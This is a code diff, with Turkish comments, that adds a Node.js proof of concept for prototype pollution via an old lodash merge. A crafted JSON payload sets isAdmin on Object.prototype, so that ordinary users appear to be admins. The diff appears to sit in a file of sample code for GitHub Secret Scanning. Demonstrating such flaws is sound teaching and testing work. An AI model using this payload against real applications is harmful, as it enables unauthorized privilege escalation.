@@ -1,3 +1,26 @@
+const _ = require('lodash');
+
+// Basit bir konfigürasyon nesnesi ve saldırganın gönderebileceği bir payload
+const config = {};
+const maliciousPayload = '{"constructor": {"prototype": {"isAdmin": true}}}';
+
+console.log("--- Saldırı Öncesi ---");
+console.log("Normal Kullanıcı Admin mi?", {}.isAdmin); // undefined döner
+
+// Lodash'in eski sürümündeki 'merge' veya 'defaultsDeep' fonksiyonu 
+// bu JSON'ı işlerken ana Object prototype'ını kirletir.
+_.merge(config, JSON.parse(maliciousPayload));
+
+console.log("\n--- Saldırı Sonrası (Prototype Pollution) ---");
+// ARTIK SİSTEMDEKİ TÜM BOŞ NESNELER 'isAdmin: true' ÖZELLİĞİNE SAHİP OLDU!
+const normalUser = {}; 
+console.log("Normal Kullanıcı Admin mi?", normalUser.isAdmin); // true döner!
+
+if (normalUser.isAdmin) {
+    console.warn("⚠️ GÜVENLİK AÇIĞI BAŞARILI: Standart kullanıcı admin yetkisi kazandı!");
+}
+
+
 // GitHub Secret Scanning tarafından yakalanacak örnek kodlar
 
 // 1. AWS Erişim Anahtarları (En yaygın yakalananlardan biri)
